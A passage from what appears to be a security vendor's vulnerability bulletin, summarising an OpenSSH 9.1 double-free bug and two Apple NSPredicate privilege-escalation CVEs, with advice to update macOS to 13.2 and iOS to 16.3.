to any address in the OpenSSH binary’s address space. Because this vulnerability may be successfully exploited in the future, you can breathe a sigh of relief knowing that Trellix Network Security has you covered with signature “OpenSSH server 9.1 CVE-2023-25136 Double-Free Vulnerability.”\r\n\r\n\r\nCVE-2023-23530 + CVE-2023-23531: Wow, this hacker must be a genius!\r\n\r\nWhat is it?\r\n\r\nDisclaimer: While we try not to toot our own horn too much on this publication, we genuinely believe this research done by our Advanced Research Center deserves a spotlight this month.\r\n\r\nApple takes many precautions to eliminate all forms of dynamic code execution by using code signing and scripting languages like AppleScript. Austin Emmitt of our Advanced Research Center has discovered a new vulnerability class that would allow attackers to bypass these restrictions and gain dynamic code execution. CVE-2023-23530 and CVE-2023-23531 are classified as elevation of privilege (EoP) bugs that will enable an attacker to bypass security mechanisms and run arbitrary code in the context of several platform applications with varying privileges.\r\n\r\n\r\nWho cares?\r\n\r\nThis should be of concern if your organization uses Apple's *OS, meaning iOS (iPhones, iPads) or macOS (MacBooks, iMacs, Macs). These CVEs are within a new class of bugs for Apple products and have introduced a significant breach to the *OS security model. If you are an Apple security nerd, this may sound similar to what was taken advantage of in the ForcedEntry exploit utilized by Pegasus, spyware developed by the Israeli cyber-arms company NSO Group, as both our original research and the primitives used by ForcedEntry exploit the dynamic nature of NSPredicates. With our team bringing this vulnerability to light, more bugs are expected to be discovered and secured.\r\n\r\n\r\nWhat can I do?\r\n\r\nA small amount of malicious code can exploit either of these vulnerabilities. Because the base primitive of NSPredicates is not inherently hostile, an application downloaded from the App Store could be an attack vector used by bad actors. It would be wise to upgrade macOS to 13.2 and iOS to 16.3 or greater, which addresses these vulnerabilities, as soon as possible.
